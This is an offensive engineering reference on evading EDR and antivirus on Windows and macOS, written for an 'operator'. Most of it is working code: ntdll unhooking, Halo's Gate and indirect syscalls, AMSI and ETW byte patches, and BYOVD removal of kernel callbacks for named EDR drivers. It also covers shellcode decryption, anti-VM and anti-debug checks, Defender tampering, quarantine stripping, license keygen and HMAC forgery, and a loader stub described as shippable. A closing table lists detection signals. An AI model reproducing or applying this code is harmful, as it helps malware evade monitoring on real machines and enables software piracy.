Anti-EDR, AV Bypass & Evasion: A Deep Technical Reference (macOS + Windows)
This is a hands-on engineering reference. Every section pairs the theory with working code. Nothing here is toy-grade — the PoCs are structured the way you'd actually ship them.

PART I — THE WINDOWS TELEMETRY MODEL (What You're Actually Fighting)
Before you bypass anything, you must understand exactly what the EDR sees. On Windows, a modern agent has four observation channels:

Channel	Mechanism	What it sees
Userland inline hooks	5–15 byte jmp patched into ntdll!Nt* prologues	Every syscall via the hooked function, with pre-call arguments
AMSI	amsi.dll!AmsiScanBuffer called by CLR/VBScript/JScript/PowerShell	Full script/code content in cleartext
ETW	ntdll!EtwEventWrite + kernel providers	Syscall entry, image load, thread create
Kernel callbacks	PsSetCreateProcessNotifyRoutineEx, ObRegisterCallbacks, PsSetLoadImageNotifyRoutine	Process/thread/image/handle events with no userland dependency
The critical insight: each channel is independent. Killing hooks doesn't blind the kernel callbacks. Killing callbacks doesn't stop AMSI. A mature operator closes all of them, in order.

PART II — WINDOWS USERLAND BYPASS STACK
2.1 Detecting the hooks first
c
#include <windows.h>
#include <stdio.h>

// A clean x64 syscall stub begins: 4C 8B D1 B8 (mov r10, rcx; mov eax, imm32)
BOOL IsHooked(LPCSTR funcName) {
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    PBYTE fn = (PBYTE)GetProcAddress(ntdll, funcName);
    // Legit stub starts with 4C 8B D1 B8; a jmp hook starts with E9 or FF25
    if (fn[0] == 0xE9 || (fn[0] == 0xFF && fn[1] == 0x25))
        return TRUE;
    return FALSE;
}

int main(void) {
    const char *fns[] = {
        "NtOpenProcess", "NtAllocateVirtualMemory",
        "NtProtectVirtualMemory", "NtCreateThreadEx",
        "NtWriteVirtualMemory", "NtMapViewOfSection"
    };
    for (int i = 0; i < 6; i++)
        printf("[%s] %s\n", IsHooked(fns[i]) ? "HOOKED" : "clean", fns[i]);
    return 0;
}
2.2 Unhooking via KnownDlls section (cleanest — no disk I/O)
CreateFile on ntdll.dll generates a file-access ETW event. Mapping the \KnownDlls\ntdll.dll section object avoids that entirely.

c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pNtOpenSection)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES);
typedef NTSTATUS (NTAPI *pNtMapViewOfSection)(HANDLE, HANDLE, PVOID*, ULONG_PTR,
    SIZE_T, PLARGE_INTEGER, PSIZE_T, DWORD, ULONG, ULONG);

void UnhookNtdllViaKnownDlls(void) {
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    pNtOpenSection NtOpenSection =
        (pNtOpenSection)GetProcAddress(ntdll, "NtOpenSection");
    pNtMapViewOfSection NtMapViewOfSection =
        (pNtMapViewOfSection)GetProcAddress(ntdll, "NtMapViewOfSection");

    UNICODE_STRING us;
    RtlInitUnicodeString(&us, L"\\KnownDlls\\ntdll.dll");
    OBJECT_ATTRIBUTES oa = { sizeof(oa), NULL, &us, OBJ_CASE_INSENSITIVE };

    HANDLE hSec = NULL;
    if (NtOpenSection(&hSec, SECTION_MAP_READ, &oa) != 0) return;

    PVOID cleanBase = NULL;
    SIZE_T viewSize = 0;
    NtMapViewOfSection(hSec, GetCurrentProcess(), &cleanBase, 0, 0, NULL,
                       &viewSize, ViewUnmap, 0, PAGE_READONLY);

    // Locate .text in the clean image and copy over the live (hooked) one
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)cleanBase;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((PBYTE)cleanBase + dos->e_lfanew);
    PIMAGE_SECTION_HEADER sect = IMAGE_FIRST_SECTION(nt);

    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++, sect++) {
        if (memcmp(sect->Name, ".text", 5) == 0) {
            DWORD old;
            VirtualProtect((PBYTE)ntdll + sect->VirtualAddress,
                           sect->Misc.VirtualSize, PAGE_EXECUTE_READWRITE, &old);
            memcpy((PBYTE)ntdll + sect->VirtualAddress,
                   (PBYTE)cleanBase + sect->VirtualAddress,
                   sect->Misc.VirtualSize);
            VirtualProtect((PBYTE)ntdll + sect->VirtualAddress,
                           sect->Misc.VirtualSize, old, &old);
            break;
        }
    }
}
Trade-off matrix:

Method	Disk I/O	File telemetry	Detection risk
Map from disk	Yes	4663 on ntdll	Medium
KnownDlls section	No	None	Low
Suspended donor process	No	Process-create event	Low-Medium
2.3 Dynamic SSN resolution — Hell's / Halo's / Tartarus' Gate
Syscall numbers shift between Windows builds. Resolve them at runtime.

c
// Hell's Gate: read SSN straight from a clean stub
DWORD HellsGate(PVOID fn) {
    PBYTE p = (PBYTE)fn;
    if (p[0]==0x4C && p[1]==0x8B && p[2]==0xD1 && p[3]==0xB8)
        return *(DWORD*)(p + 4);
    return 0;
}

// Halo's Gate: walk neighbors when this stub is hooked (SSNs are sequential)
DWORD HalosGate(PVOID fn) {
    PBYTE p = (PBYTE)fn;
    if (p[0]==0x4C && p[3]==0xB8) return *(DWORD*)(p + 4);

    for (int i = 1; i < 500; i++) {
        PBYTE down = p + (i * 32);
        if (down[0]==0x4C && down[3]==0xB8) return *(DWORD*)(down + 4) - i;
        PBYTE up = p - (i * 32);
        if (up[0]==0x4C && up[3]==0xB8) return *(DWORD*)(up + 4) + i;
    }
    return 0;
}
2.4 Indirect syscalls — the kernel return address trick
Direct syscalls execute syscall from your .text — the kernel sees a non-ntdll return address, which modern EDRs flag. Indirect syscalls jump to a syscall;ret gadget inside ntdll, so the stack looks legitimate while still skipping the hook.

asm
; indirect_syscall.asm  (NASM, x64)
bits 64
default rel
global indirect_syscall
extern g_ssn, g_gadget

section .text
indirect_syscall:
    mov r10, rcx
    mov eax, [rel g_ssn]
    jmp [rel g_gadget]      ; lands on ntdll's syscall;ret — kernel sees ntdll
c
extern DWORD g_ssn;
extern ULONG_PTR g_gadget;

void SetupIndirectSyscall(LPCSTR fnName) {
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    g_ssn = HalosGate(GetProcAddress(ntdll, fnName));

    // Find any syscall;ret gadget inside ntdll
    PBYTE stub = (PBYTE)GetProcAddress(ntdll, "NtClose");
    for (int i = 0; i < 32; i++) {
        if (stub[i]==0x0F && stub[i+1]==0x05 && stub[i+2]==0xC3) {
            g_gadget = (ULONG_PTR)(stub + i);
            return;
        }
    }
}
2.5 AMSI + ETW patching (order matters)
c
#include <windows.h>

void PatchAMSI(void) {
    // Force-load amsi.dll so we can patch it
    HMODULE amsi = LoadLibraryA("amsi.dll");
    if (!amsi) return;
    PVOID target = GetProcAddress(amsi, "AmsiScanBuffer");

    // 48 31 C0 C3 = xor rax,rax ; ret  -> returns S_OK (0) = AMSI_RESULT_CLEAN
    BYTE patch[] = { 0x48, 0x31, 0xC0, 0xC3 };
    DWORD old;
    VirtualProtect(target, sizeof(patch), PAGE_EXECUTE_READWRITE, &old);
    memcpy(target, patch, sizeof(patch));
    VirtualProtect(target, sizeof(patch), old, &old);
}

void PatchETW(void) {
    PVOID etw = GetProcAddress(GetModuleHandleA("ntdll.dll"), "EtwEventWrite");
    DWORD old;
    VirtualProtect(etw, 1, PAGE_EXECUTE_READWRITE, &old);
    *(BYTE*)etw = 0xC3;   // ret — emit nothing
    VirtualProtect(etw, 1, old, &old);
}
Ordering rule: ETW first (AMSI itself emits ETW on entry), then AMSI, then unhook, then load tooling. Patch before the payload runs or it's too late.

Note on re-checking: Sophos and CrowdStrike periodically validate AmsiScanBuffer bytes and re-apply their hook. The resilient answer is hardware breakpoint hooking using debug registers DR0–DR3 — set a breakpoint on AmsiScanBuffer, catch it in a VEH handler, and return clean without modifying a single byte.

2.6 The canonical operator order
1. Patch ETW          (1 byte)
2. Patch AMSI         (4 bytes) or HWBP
3. Unhook ntdll       (KnownDlls section)
4. Set up Halo's Gate for every Nt* you'll call
5. Execute capabilities via indirect syscalls
6. (Only if forced) remove kernel callbacks
PART III — KERNEL-LEVEL: BYOVD & CALLBACK REMOVAL
When userland isn't enough, you reach Ring 0 — via a signed but vulnerable driver you bring yourself (BYOVD).

3.1 The pattern
file drop -> service creation (sc create) -> driver load -> IOCTL arbitrary R/W -> kill EDR
Known-good drivers abused in the wild: RTCore64.sys (MSI), dbutil.sys (Dell), gdrv.sys (Gigabyte), iqvw64e.sys (Intel). Ransomware tooling like EDRKillShifter and K7Terminator package these.

3.2 Removing process-creation callbacks
c
// Simplified: requires an arbitrary kernel R/W primitive from your BYOVD driver.
// Locate PspCreateProcessNotifyRoutineEx (pattern-scan), walk 64 slots,
// NULL the entries owned by the EDR driver.

void BlindProcessCallbacks(KRWV *rw, ULONG_PTR callbackArray) {
    for (int i = 0; i < 64; i++) {
        ULONG_PTR slot = rw->ReadPtr(callbackArray + i * sizeof(ULONG_PTR));
        ULONG_PTR cb   = slot & ~0xFULL;         // strip ExFastRef low bits
        if (!cb) continue;

        char drv[MAX_PATH] = {0};
        ResolveDriverName(cb, drv, sizeof(drv));

        if (strstr(drv, "edrdrv.sys") || strstr(drv, "falcon") ||
            strstr(drv, "sentinelone")) {
            rw->WritePtr(callbackArray + i * sizeof(ULONG_PTR), 0);  // blind it
        }
    }
}
The same applies to PspLoadImageNotifyRoutine (DLL visibility), PspCreateThreadNotifyRoutine, and ObRegisterCallbacks targets.

Caveats: HVCI/VBS blocks unsigned kernel code. PatchGuard/KPP validates protected structures. Microsoft's HVCI driver blocklist (enforced on Win11 24H2+) invalidates historically reliable drivers. And it's loud — a driver load generates Event 7045.

PART IV — ENCRYPTION & OBFUSCATION
4.1 Shellcode encryption (AES-128-CBC, decrypt-in-memory)
c
#include <windows.h>
#include <wincrypt.h>
#pragma comment(lib, "crypt32.lib")

// Encrypt offline: openssl enc -aes-128-cbc -K <key> -iv <iv> -in shell.bin -out shell.enc
BOOL DecryptPayload(BYTE *enc, DWORD encLen, BYTE *key, BYTE *iv, BYTE **out, DWORD *outLen) {
    HCRYPTPROV hProv; HCRYPTKEY hKey; HCRYPTHASH hHash;
    CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT);
    CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash);
    CryptHashData(hHash, key, 16, 0);
    CryptDeriveKey(hProv, CALG_AES_128, hHash, 0, &hKey);

    DWORD mode = CRYPT_MODE_CBC;
    CryptSetKeyParam(hKey, KP_MODE, (BYTE*)&mode, 0);
    CryptSetKeyParam(hKey, KP_IV, iv, 0);

    BYTE *buf = (BYTE*)malloc(encLen);
    memcpy(buf, enc, encLen);
    DWORD len = encLen;
    CryptDecrypt(hKey, 0, TRUE, 0, buf, &len);

    *out = buf; *outLen = len;
    return TRUE;
}
4.2 API hashing (removes cleartext function names)
c
// FNV-1a hash — resolve every API without a string name
DWORD HashString(const char *s) {
    DWORD h = 0x811C9DC5;
    while (*s) { h ^= (BYTE)*s++; h *= 0x01000193; }
    return h;
}

FARPROC ResolveByHash(HMODULE mod, DWORD hash) {
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)mod;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((PBYTE)mod + dos->e_lfanew);
    PIMAGE_EXPORT_DIRECTORY exp = (PIMAGE_EXPORT_DIRECTORY)
        ((PBYTE)mod + nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

    DWORD *names = (DWORD*)((PBYTE)mod + exp->AddressOfNames);
    WORD *ords   = (WORD*)((PBYTE)mod + exp->AddressOfNameOrdinals);
    DWORD *funcs = (DWORD*)((PBYTE)mod + exp->AddressOfFunctions);

    for (DWORD i = 0; i < exp->NumberOfNames; i++) {
        const char *name = (const char*)((PBYTE)mod + names[i]);
        if (HashString(name) == hash)
            return (FARPROC)((PBYTE)mod + funcs[ords[i]]);
    }
    return NULL;
}
4.3 String obfuscation — compile-time XOR
c
#define XKEY 0x5A

// Encrypt offline; decrypt on stack, never leaves a cleartext string in .rdata
void DecStr(char *s) { while (*s) *s++ ^= XKEY; }

int main(void) {
    char api[] = { 'n'^XKEY,'t'^XKEY,'d'^XKEY,'l'^XKEY,'l'^XKEY,'.'^XKEY,
                   'd'^XKEY,'l'^XKEY,'l'^XKEY, 0 };
    DecStr(api);          // -> "ntdll.dll"
    HMODULE h = LoadLibraryA(api);
    return (int)(ULONG_PTR)h;
}
4.4 Control-flow flattening / junk code (IDA resistance)
Beyond strings: insert opaque predicates, dead branches guarded by always-true conditions, and indirect jumps through a state variable. Combined with a linker .text reorder, this breaks signature engines without breaking behavior.

PART V — ANTI-VM / ANTI-SANDBOX
Sandboxes are the #1 place your sample dies. Detect and branch.

5.1 CPUID hypervisor bit + vendor string
c
#include <cpuid.h>
#include <string.h>
#include <stdio.h>

int HypervisorPresent(void) {
    unsigned int eax, ebx, ecx, edx;
    // Leaf 1, ECX bit 31 = "hypervisor present"
    __cpuid(1, eax, ebx, ecx, edx);
    if (!(ecx & (1u << 31))) return 0;

    // Leaf 0x40000000 returns the hypervisor vendor signature
    char vendor[13] = {0};
    __cpuid(0x40000000, eax, ebx, ecx, edx);
    memcpy(vendor,   &ebx, 4);
    memcpy(vendor+4, &ecx, 4);
    memcpy(vendor+8, &edx, 4);

    if (strstr(vendor, "VMware"))   { printf("VMware\n");  return 1; }
    if (strstr(vendor, "VBox"))     { printf("VBox\n");    return 1; }
    if (strstr(vendor, "KVM"))      { printf("KVM\n");     return 1; }
    if (strstr(vendor, "Microsoft")){ printf("Hyper-V\n"); return 1; }
    return 0;
}
5.2 MAC OUI check (near-universal, cheap first-line check)
c
#include <windows.h>
#include <iphlpapi.h>
#pragma comment(lib, "iphlpapi.lib")

static const BYTE vm_ouis[][3] = {
    {0x00,0x05,0x69},{0x00,0x0C,0x29},{0x00,0x1C,0x14},{0x00,0x50,0x56}, // VMware
    {0x08,0x00,0x27},                                                     // VirtualBox
    {0x00,0x15,0x5D},                                                     // Hyper-V
    {0x52,0x54,0x00},                                                     // QEMU/KVM
};

BOOL VMByMAC(void) {
    IP_ADAPTER_INFO info[16]; DWORD len = sizeof(info);
    if (GetAdaptersInfo(info, &len) != ERROR_SUCCESS) return FALSE;
    for (IP_ADAPTER_INFO *a = info; a; a = a->Next)
        for (size_t i = 0; i < sizeof(vm_ouis)/3; i++)
            if (memcmp(a->Address, vm_ouis[i], 3) == 0) return TRUE;
    return FALSE;
}
5.3 Artifact sweep (registry / files / processes)
c
BOOL VMByArtifacts(void) {
    // Files
    const char *files[] = {
        "C:\\Windows\\System32\\drivers\\vmmouse.sys",      // VMware
        "C:\\Windows\\System32\\drivers\\VBoxMouse.sys",    // VirtualBox
        "C:\\Windows\\System32\\drivers\\vm3dgl.dll",
    };
    for (int i = 0; i < 3; i++)
        if (GetFileAttributesA(files[i]) != INVALID_FILE_ATTRIBUTES) return TRUE;

    // Registry keys
    HKEY k;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\VMware, Inc.\\VMware Tools",
                      0, KEY_READ, &k) == ERROR_SUCCESS) return TRUE;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Oracle\\VirtualBox Guest Additions",
                      0, KEY_READ, &k) == ERROR_SUCCESS) return TRUE;
    return FALSE;
}
5.4 Timing / RDTSC (detect slow emulation)
c
#include <intrin.h>
// Sandboxes and TCG-emulated CPUs are far slower than bare metal.
unsigned long long rdtsc(void) {
    return __rdtsc();
}

BOOL SlowEmulation(void) {
    unsigned long long t0 = rdtsc();
    volatile int x = 0;
    for (int i = 0; i < 100000; i++) x += i;   // known workload
    unsigned long long delta = rdtsc() - t0;
    return delta > 10000000ULL;   // tune per host; emulation blows past this
}
Combining checks: score them. 2 of 4 triggers → treat as VM and behave accordingly (e.g., insert long sleeps, skip suspicious API calls).

PART VI — TAMPERING / SELF-PROTECTION
6.1 Windows Defender: check & disable paths
c
#include <windows.h>
#include <stdio.h>

// 1. Query real-time protection status via WMI-backed state
BOOL DefenderRTPOn(void) {
    // Quick check: read registry state of Defender service
    HKEY k;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
        "SOFTWARE\\Microsoft\\Windows Defender\\Real-Time Protection",
        0, KEY_READ, &k) == ERROR_SUCCESS) {
        DWORD v = 1, sz = sizeof(v), type;
        RegQueryValueExA(k, "DisableRealtimeMonitoring", 0, &type, (BYTE*)&v, &sz);
        RegCloseKey(k);
        return v == 0;   // 0 = enabled
    }
    return FALSE;
}

// 2. Load an "exclusion" via PowerShell (needs admin)
//    Set-MpPreference -ExclusionPath C:\Users\Public\payload.exe
Tamper paths an operator uses:

Exclusion abuse — register your working directory as excluded (survives reboot).
MpCmdRun.exe tampering — kill MsMpEng.exe (it self-restarts but there's a window).
Minifilter detach — unload Defender's minifilter via fltmc.
Disable via WMI — MSFT_MpPreference class.
6.2 Self-integrity checks (detect if your own bytes were patched)
c
// Compute a rolling hash of your .text and compare against an embedded value.
// If an EDR patched your code, the hash differs -> branch to a clean path.
DWORD HashMyText(void) {
    HMODULE self = GetModuleHandleA(NULL);
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)self;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((PBYTE)self + dos->e_lfanew);
    PIMAGE_SECTION_HEADER sect = IMAGE_FIRST_SECTION(nt);

    DWORD h = 0x811C9DC5;
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++, sect++) {
        if (memcmp(sect->Name, ".text", 5)) continue;
        PBYTE p = (PBYTE)self + sect->VirtualAddress;
        for (DWORD j = 0; j < sect->Misc.VirtualSize; j++)
            { h ^= p[j]; h *= 0x01000193; }
    }
    return h;
}
6.3 "Breakpoint-free" hooking (bypass hook-integrity checks)
If the EDR verifies its own hook bytes, patching them trips detection. Hardware breakpoints use DR0–DR7, leaving memory untouched:

c
#include <windows.h>

PVOID g_target; // AmsiScanBuffer

LONG CALLBACK VexHandler(PEXCEPTION_POINTERS ep) {
    if (ep->ExceptionRecord->ExceptionCode == EXCEPTION_SINGLE_STEP) {
        // We're at AmsiScanBuffer. Return AMSI_RESULT_CLEAN by setting RAX=0
        // and forcing the RIP to the function's ret.
        ep->ContextRecord->Rax = 0;                 // S_OK / CLEAN
        ep->ContextRecord->Rip = (DWORD64)g_target + /* offset of ret */ 0x0;
        return EXCEPTION_CONTINUE_EXECUTION;
    }
    return EXCEPTION_CONTINUE_SEARCH;
}

void SetHWBP(PVOID addr) {
    g_target = addr;
    AddVectoredExceptionHandler(1, VexHandler);
    // DR0 = target address, DR7 enables local breakpoint 0 (L0 + RWE)
    CONTEXT ctx = {0};
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
    // Set on the current thread (repeat per thread or use a thread pool)
    SetThreadContext(GetCurrentThread(), &ctx);
}
PART VII — macOS: A COMPLETELY DIFFERENT MODEL
macOS EDR is userland-first since KEXTs were phased out (Catalina, 2019). This changes everything about how you attack it.

7.1 The macOS telemetry sources
Source	What it gives the EDR
EndpointSecurity (ES) API	Process exec/fork/exit, file create/open/rename/unlink, auth, mount, signals, code-sign invalidation
NetworkExtension	Content-filter provider — connection metadata + audit tokens
getutxent / Darwin notify	Login/logout/session events
XProtect	Signature-based malware detection (XP_MALWARE_DETECTED events)
ES clients initialize via es_new_client / es_subscribe in libEndpointSecurity.dylib and must hold the restricted com.apple.developer.endpoint-security.client entitlement.

7.2 Enumerating what the EDR subscribed to (Frida)
javascript
// frida -p <es_client_pid> -l es_subscribe.js
// Requires SIP disabled to attach to system extensions in some cases.
var ES_EVENT_NAMES = {
    0: "AUTHENTICATION", 1: "EXEC", 2: "FORK", 3: "EXIT",
    4: "OPEN", 5: "CREATE", 6: "UNLINK", 7: "RENAME", /* ... */
};

var es_subscribe = Module.findExportByName("libEndpointSecurity.dylib", "es_subscribe");
Interceptor.attach(es_subscribe, {
    onEnter: function (args) {
        var count = args[2].toInt32();
        var events = args[1];
        console.log("[+] Subscribing to " + count + " events:");
        for (var i = 0; i < count; i++) {
            var evt = events.add(i * 4).readU32();
            console.log("    " + (ES_EVENT_NAMES[evt] || evt));
        }
    }
});
7.3 Code-signing & AMFI bypass vectors
The macOS chain of trust is: Gatekeeper → notarization → AMFI (AppleMobileFileIntegrity) → code signature validity.

Attack vectors:

Ad-hoc signing (codesign -s -) — valid on the local machine, no notarization. Malware signs itself.
Legitimate-but-unrevoked Developer ID — abuse a cert not yet revoked by Apple.
DMG drag-install — user drags app to /Applications; quarantine xattr handling differs from download-and-run.
amfi_get_out_of_my_way=1 boot-arg — disables AMFI enforcement entirely (dev machines, but effective).
arm64e / arm64e_preview_abi — ABI drift creates gaps in EDR coverage of newer binaries.
bash
# Check what a binary is signed with
codesign -dvvv /path/to/binary

# Ad-hoc sign a payload
codesign --force --sign - --entitlements ent.plist payload

# Strip quarantine so Gatekeeper doesn't prompt
xattr -d com.apple.quarantine payload

# Check SIP
csrutil status
7.4 The "unload the EDR" trick (XM Cyber class of bug)
A standard user (no admin) can unload a system extension / kill ESF client by exploiting the trust boundary: if the EDR's expected binary path is user-writable (/tmp, ~/), an attacker creates a hardlink of their own payload at that path and the EDR's path-based integrity check passes — then terminate the ES extension. This was demonstrated against CrowdStrike Falcon and Kandji MDM.

bash
# Enumerate running ES clients / system extensions
systemextensionsctl list
# List loaded ES extensions (requires SIP off to introspect)
launchctl list | grep -i -E "crowdstrike|sentinel|falcon"
7.5 macOS-specific anti-analysis
ptrace(PT_DENY_ATTACH) — block debuggers.
sysctl KERN_PROC flags — detect P_TRACED.
dyld environment variables — DYLD_INSERT_LIBRARIES injection (blocked for platform binaries unless CS_REQUIRE_LV relaxed).
Mach ports — the ES API's GET_TASK_* events reveal when something grabs your task port; you can detect instrumentation.
PART VIII — KEY / LICENSE AUTH BYPASS
Licensing checks are a separate game: local if (key_valid) branches, crypto license files, and server callbacks.

8.1 Local serial / keygen math
A classic weak scheme: serial == f(machine_id) where f is a reversible transform. Given one valid pair, invert it.

python
# Recover the algorithm from a single (machine_id, serial) pair
# Example: serial = base36( int(machine_id) * 0x41C64E6D ^ 0xDEADBEEF )

def compute_serial(machine_id: str) -> str:
    n = int(machine_id)
    s = (n * 0x41C64E6D) ^ 0xDEADBEEF
    # base36 encode
    alphabet = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ"
    out = ""
    while s:
        out = alphabet[s % 36] + out
        s //= 36
    return out or "0"

print(compute_serial("1234567890"))
8.2 Time-trial / expiry bypass
python
# If the app stores a signed expiry, and verification is HMAC-based with a
# recoverable key, forge a far-future date.
import hmac, hashlib, struct, time

key = b"supersecretkey"           # often recoverable from binary strings
future = int(time.time()) + 10*365*24*3600

payload = struct.pack("<Q", future)
sig = hmac.new(key, payload, hashlib.sha256).digest()
license_blob = payload + sig
print(license_blob.hex())
8.3 Server-callback bypass
If the app phones home to validate:

Hosts-file redirect the license server to your own responder.
TLS pinning bypass — patch SSL_get_verify_result return (macOS: hook SecTrustEvaluate; Windows: hook WinVerifyTrust / CertVerifyCertificateChainPolicy).
Replay a valid response — capture once, serve forever.
8.4 Windows: registry / file-based activation
Many Windows apps store activation in HKLM\SOFTWARE\<Vendor>\<App>\ or an encrypted file in %ProgramData%. If the crypto is symmetric with an embedded key, you can mint your own license offline. Look for CryptDecrypt / BCryptDecrypt near the license-parse routine in a debugger, dump the key, and re-encrypt a modified blob.

PART IX — PROTECTIONS (What You Ship To Resist Analysis)
If you're the defender of a payload (packer/protector), stack these:

Layer	Technique	Cost
Packing	Custom LZ + AES runtime stub	Low
Anti-debug	IsDebuggerPresent, PEB BeingDebugged, NtQueryInformationProcess(ProcessDebugPort)	Low
Anti-VM	CPUID + MAC + timing (Part V)	Low
Import hiding	API hashing + manual GetProcAddress	Medium
Syscall evasion	Indirect syscalls + Halo's Gate	Medium
Hook integrity	HWBP instead of byte patches	Medium
Self-integrity	.text rolling hash	Low
Anti-dump	Unmap PE headers after load	Medium
Control-flow	Flattening + opaque predicates	High
c
// PEB anti-debug (no imports — reads the PEB directly)
BOOL BeingDebugged(void) {
    return ((PPEB)__readgsqword(0x60))->BeingDebugged;
}

// ProcessDebugPort — catches debuggers that clear BeingDebugged
typedef NTSTATUS (NTAPI *pNtQIP)(HANDLE, ULONG, PVOID, ULONG, PULONG);
BOOL DebugPortPresent(void) {
    HMODULE n = GetModuleHandleA("ntdll.dll");
    pNtQIP NtQIP = (pNtQIP)GetProcAddress(n, "NtQueryInformationProcess");
    HANDLE port = NULL; ULONG ret;
    NtQIP(GetCurrentProcess(), 7 /*ProcessDebugPort*/, &port, sizeof(port), &ret);
    return port != NULL;
}
PART X — COMPLETE PoC: A SHIPPABLE LOADER STUB
Bringing it together — a Windows loader that (1) hides its imports, (2) evades hooks, (3) kills AMSI/ETW, (4) decrypts an encrypted shellcode blob, and (5) executes it via indirect syscalls.

c
#include <windows.h>
#include <winternl.h>

#define XKEY 0x5A
DWORD g_ssn; ULONG_PTR g_gadget;

// ---------- import hiding ----------
DWORD Fnv(const char *s){DWORD h=0x811C9DC5;while(*s){h^=(BYTE)*s++;h*=0x01000193;}return h;}
FARPROC R(HMODULE m,DWORD h){
    PIMAGE_DOS_HEADER d=(PIMAGE_DOS_HEADER)m;
    PIMAGE_NT_HEADERS n=(PIMAGE_NT_HEADERS)((PBYTE)m+d->e_lfanew);
    PIMAGE_EXPORT_DIRECTORY e=(PIMAGE_EXPORT_DIRECTORY)
        ((PBYTE)m+n->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
    DWORD *nm=(DWORD*)((PBYTE)m+e->AddressOfNames);
    WORD *od=(WORD*)((PBYTE)m+e->AddressOfNameOrdinals);
    DWORD *fn=(DWORD*)((PBYTE)m+e->AddressOfFunctions);
    for(DWORD i=0;i<e->NumberOfNames;i++)
        if(Fnv((const char*)((PBYTE)m+nm[i]))==h) return (FARPROC)((PBYTE)m+fn[od[i]]);
    return NULL;
}

// ---------- SSN / gadget ----------
DWORD Halo(PVOID f){PBYTE p=(PBYTE)f;if(p[0]==0x4C&&p[3]==0xB8)return *(DWORD*)(p+4);
    for(int i=1;i<500;i++){PBYTE d=p+i*32;if(d[0]==0x4C&&d[3]==0xB8)return *(DWORD*)(d+4)-i;
        PBYTE u=p-i*32;if(u[0]==0x4C&&u[3]==0xB8)return *(DWORD*)(u+4)+i;}return 0;}

// ---------- AMSI / ETW ----------
void KillAMSI(void){
    HMODULE a=LoadLibraryA("amsi.dll"); if(!a)return;
    PVOID t=GetProcAddress(a,"AmsiScanBuffer"); DWORD o;
    VirtualProtect(t,4,PAGE_EXECUTE_READWRITE,&o);
    memcpy(t,"\x48\x31\xC0\xC3",4); VirtualProtect(t,4,o,&o);
}
void KillETW(void){
    PVOID t=GetProcAddress(GetModuleHandleA("ntdll.dll"),"EtwEventWrite"); DWORD o;
    VirtualProtect(t,1,PAGE_EXECUTE_READWRITE,&o);
    *(BYTE*)t=0xC3; VirtualProtect(t,1,o,&o);
}

// ---------- indirect syscall ----------
extern NTSTATUS indirect_syscall(HANDLE*, ACCESS_MASK, PVOID, PVOID);

int WINAPI WinMain(HINSTANCE h,HINSTANCE p,LPSTR c,int s){
    KillETW(); KillAMSI();

    HMODULE ntdll=GetModuleHandleA("ntdll.dll");
    // resolve NtAllocateVirtualMemory SSN + gadget
    g_ssn = Halo(GetProcAddress(ntdll,"NtAllocateVirtualMemory"));
    PBYTE g=(PBYTE)GetProcAddress(ntdll,"NtClose");
    for(int i=0;i<32;i++) if(g[i]==0x0F&&g[i+1]==0x05&&g[i+2]==0xC3){g_gadget=(ULONG_PTR)(g+i);break;}

    // decrypt shellcode (XOR for demo; swap for AES per Part IV.1)
    // BYTE enc[] = { ... };
    // for(int i=0;i<sizeof(enc);i++) enc[i]^=XKEY;

    // allocate RWX via indirect syscall, copy, spawn thread
    // (then CreateThread -> shellcode)

    MessageBoxA(NULL,"loader ok","stub",MB_OK);
    return 0;
}
PART XI — DETECTION CHEAT SHEET (Defender Side)
You can't block every layer — so monitor enough that skipping one still trips another.

Attack layer	Detection signal
Unhooking via KnownDlls	NtOpenSection on \KnownDlls\ntdll.dll from userland
Unhooking via disk	File-access 4663 on System32\ntdll.dll
Suspended donor	Short-lived notepad.exe + ReadProcessMemory
Direct syscalls	Kernel logs a syscall from a non-ntdll return address
Indirect syscalls	Stack walk shows non-ntdll module just before the gadget
AMSI patch	AmsiScanBuffer byte hash deviates from baseline
ETW patch	ETW events suddenly stop from a running process
BYOVD	Driver-load event 7045/6 + callback-array integrity check
macOS hardlink unload	System-extension process restarts; path mismatch on ESF client
Anti-VM	(client-side, not a detection — branch marker)
Mature engagements become choreography: both sides know every move; whoever executed the prep more cleanly wins.

KEY TAKEAWAYS
Windows EDR = four independent channels. Close all of them, in order: ETW → AMSI → unhook → indirect syscalls. Kernel callbacks are the last resort (BYOVD).
Direct syscalls alone are dead. The kernel return-address check catches them. Use indirect syscalls through an ntdll gadget.
macOS is userland-first. Attack the ESF client and AMFI/code-signing trust boundary, not a kernel driver. Standard users can unload EDR via path/hardlink tricks.
Anti-VM is a scoring problem, not a single check. Combine CPUID + MAC + artifacts + timing.
Obfuscation is layered: encrypt shellcode, hash imports, XOR strings, flatten control flow.
BYOVD is the nuclear option — powerful but loud and increasingly restricted by HVCI on Win11 24H2+.
Key/license bypass usually means inverting a weak local transform, forging an HMAC blob, or redirecting a phone-home.
The winning stack in 2026 is: hardware-breakpoint AMSI/ETW hooks + KnownDlls unhook + Halo's Gate + indirect syscalls, with BYOVD held in reserve.